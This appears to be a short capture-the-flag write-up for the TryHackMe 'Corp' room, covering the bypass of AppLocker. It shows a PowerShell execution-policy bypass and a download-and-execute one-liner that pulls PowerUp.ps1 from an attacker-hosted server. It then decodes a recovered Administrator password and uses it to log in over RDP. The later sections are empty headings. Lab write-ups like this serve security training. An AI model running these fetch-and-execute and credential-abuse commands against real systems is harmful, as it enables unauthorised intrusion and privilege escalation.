# Corp

**Room Link:** [https://tryhackme.com/room/corp](https://tryhackme.com/room/corp)



## Bypassing Applocker



Load PowerUp.ps1 into memory.

**Kali**

```
wget https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1
python2 -m SimpleHTTPServer 81
```

Add the following line at the bottom to PowerUp.ps1 so it Invokes all checks automatically once downloaded

**PowerUp.ps1**

```
Invoke-AllChecks
```

**Victim(powershell)**

<pre><code>powershell -ep bypass
<strong>iex​(New-Object Net.WebClient).DownloadString('http://$KALI:81/PowerUp.ps1') 
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
echo "dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ=" | base64 -d
```

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

**Kali**

```
xfreerdp /u:"Administrator" /v:$VICTIM:3389
Password: tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T
```

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

Kerberoasting



Privilege Escalation

